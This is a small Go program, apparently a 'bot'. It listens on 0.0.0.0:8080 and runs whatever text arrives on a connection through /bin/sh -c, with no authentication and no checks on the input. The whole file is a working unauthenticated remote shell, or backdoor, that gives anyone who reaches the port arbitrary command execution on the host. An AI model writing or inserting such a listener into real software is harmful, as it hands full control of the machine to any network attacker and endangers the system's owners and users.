package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"
	"time"
)

func main() {
	var port = "8080"
	log.Println("Bot is ready to handle requests at port", port)
	l, err := net.Listen("tcp", "0.0.0.0"+":"+port)
	if err != nil {
		log.Fatal(err)
	}
	for {
		conn, err := l.Accept()
		if err != nil {
			log.Fatal(err)
		}
		go readConn(conn)
	}
}

func readConn(conn net.Conn) {
	defer conn.Close()
	for {
		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		var buf [128]byte
		n, err := conn.Read(buf[:])
		if err != nil {
			log.Printf("Finished with err: %v", err)
			return
		}
		// os.Stderr.Write(buf[:n])
		execCmd(string(buf[:n]))
	}
}

func execCmd(lnxCmd string) {
	cmd := exec.Command("/bin/sh", "-c", lnxCmd)
	out, err := cmd.Output()
	if err != nil {
		log.Printf("exec command: %v", err)
	}
	fmt.Printf("%s\n", out)
}
